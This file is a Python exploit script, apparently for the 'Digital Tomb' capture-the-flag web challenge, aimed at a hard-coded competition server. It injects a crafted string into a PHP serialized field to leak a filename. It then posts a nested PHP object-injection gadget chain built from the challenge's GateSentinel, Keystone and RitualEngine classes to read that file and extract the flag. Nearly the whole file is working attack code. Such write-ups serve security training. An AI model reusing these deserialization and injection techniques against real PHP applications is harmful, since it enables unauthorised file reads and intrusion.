#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import shutil
import subprocess
import sys
import urllib.parse
import urllib.request
from dataclasses import dataclass


DEFAULT_BASE_URL = "http://39.105.213.28:10026"
TXT_RE = re.compile(rb"([A-Za-z0-9_-]+\.txt)")
FLAG_RE = re.compile(rb"(ISCC\{[^}]+\})")


@dataclass
class PhpObject:
    class_name: str
    properties: list[tuple[bytes | str, object]]


def _to_bytes(value: bytes | str) -> bytes:
    if isinstance(value, bytes):
        return value
    return value.encode()


def _php_string(value: bytes | str) -> bytes:
    data = _to_bytes(value)
    return b's:%d:"%b";' % (len(data), data)


def _php_key(value: int | bytes | str) -> bytes:
    if isinstance(value, int):
        return b"i:%d;" % value
    return _php_string(value)


def _php_array_from_list(values: list[object]) -> bytes:
    items = [(idx, value) for idx, value in enumerate(values)]
    serialized = b"".join(_php_key(key) + _php_value(val) for key, val in items)
    return b"a:%d:{%b}" % (len(items), serialized)


def _php_array_from_dict(values: dict[int | bytes | str, object]) -> bytes:
    items = list(values.items())
    serialized = b"".join(_php_key(key) + _php_value(val) for key, val in items)
    return b"a:%d:{%b}" % (len(items), serialized)


def _php_object(value: PhpObject) -> bytes:
    class_name = value.class_name.encode()
    props = b"".join(_php_string(name) + _php_value(prop_value) for name, prop_value in value.properties)
    return b'O:%d:"%b":%d:{%b}' % (len(class_name), class_name, len(value.properties), props)


def _php_value(value: object) -> bytes:
    if value is None:
        return b"N;"
    if isinstance(value, PhpObject):
        return _php_object(value)
    if isinstance(value, list):
        return _php_array_from_list(value)
    if isinstance(value, dict):
        return _php_array_from_dict(value)
    if isinstance(value, (bytes, str)):
        return _php_string(value)
    if isinstance(value, bool):
        return b"b:%d;" % int(value)
    if isinstance(value, int):
        return b"i:%d;" % value
    raise TypeError(f"Unsupported PHP serialization type: {type(value)!r}")


def _curl_path() -> str | None:
    return shutil.which("curl.exe") or shutil.which("curl")


def _curl_request(args: list[str], timeout: int) -> bytes | None:
    curl = _curl_path()
    if not curl:
        return None

    try:
        completed = subprocess.run(
            [curl, "--silent", "--show-error", "--max-time", str(timeout), *args],
            check=True,
            capture_output=True,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    return completed.stdout


def http_get(url: str, params: dict[str, str] | None = None, timeout: int = 10) -> bytes:
    if params:
        url = f"{url}?{urllib.parse.urlencode(params)}"
    curl_response = _curl_request([url], timeout)
    if curl_response is not None:
        return curl_response
    with urllib.request.urlopen(url, timeout=timeout) as response:
        return response.read()


def http_post_form(url: str, data: dict[str, bytes | str], timeout: int = 10) -> bytes:
    encoded_parts: list[str] = []
    for key, value in data.items():
        if isinstance(value, bytes):
            encoded_parts.append(f"{urllib.parse.quote_plus(key)}={urllib.parse.quote_from_bytes(value)}")
        else:
            encoded_parts.append(
                f"{urllib.parse.quote_plus(key)}={urllib.parse.quote_plus(value)}"
            )
    encoded_body = "&".join(encoded_parts)
    curl_response = _curl_request(
        [
            "-X",
            "POST",
            "-H",
            "Content-Type: application/x-www-form-urlencoded",
            "--data-raw",
            encoded_body,
            url,
        ],
        timeout,
    )
    if curl_response is not None:
        return curl_response

    body = encoded_body.encode()
    request = urllib.request.Request(
        url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return response.read()


def exploit_stage1(base_url: str, timeout: int = 10) -> str:
    params = {
        "d": "amgoinvc" * 4,
        "p": '";s:1:"y";s:8:"admin123";}',
    }
    response = http_get(f"{base_url.rstrip('/')}/rune_trial.php", params=params, timeout=timeout)
    matches = TXT_RE.findall(response)
    if not matches:
        raise RuntimeError("stage1 failed: target txt filename not found in response")
    return matches[-1].decode()


def build_stage2_payload(filename: str) -> bytes:
    reader = PhpObject(
        "RitualEngine",
        [
            (b"\x00*\x00settings", None),
            ("target", filename),
            ("callback", None),
        ],
    )
    callback = _php_value([reader, "view"])
    invoker = PhpObject(
        "RitualEngine",
        [
            (b"\x00*\x00settings", None),
            ("target", None),
            ("callback", callback),
        ],
    )
    blade = PhpObject("Keystone", [("center", invoker)])
    inner = PhpObject(
        "GateSentinel",
        [
            ("object", None),
            ("tool", {"blade": blade}),
        ],
    )
    outer = PhpObject(
        "GateSentinel",
        [
            ("object", inner),
            ("tool", None),
        ],
    )
    return _php_value(outer)


def exploit_stage2(base_url: str, filename: str, timeout: int = 10) -> str:
    payload = build_stage2_payload(filename)
    response = http_post_form(
        f"{base_url.rstrip('/')}/mechanism_chamber.php",
        {"data": payload},
        timeout=timeout,
    )
    match = FLAG_RE.search(response)
    if not match:
        raise RuntimeError("stage2 failed: flag not found in response")
    return match.group(1).decode()


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Digital Tomb CTF web challenge.")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL, help="target base url")
    parser.add_argument("--timeout", type=int, default=10, help="request timeout in seconds")
    parser.add_argument(
        "--filename",
        help="skip stage1 and use a known txt filename directly",
    )
    args = parser.parse_args()

    try:
        filename = args.filename or exploit_stage1(args.base_url, timeout=args.timeout)
        flag = exploit_stage2(args.base_url, filename, timeout=args.timeout)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1

    print(f"[+] stage1 filename: {filename}")
    print(f"[+] flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
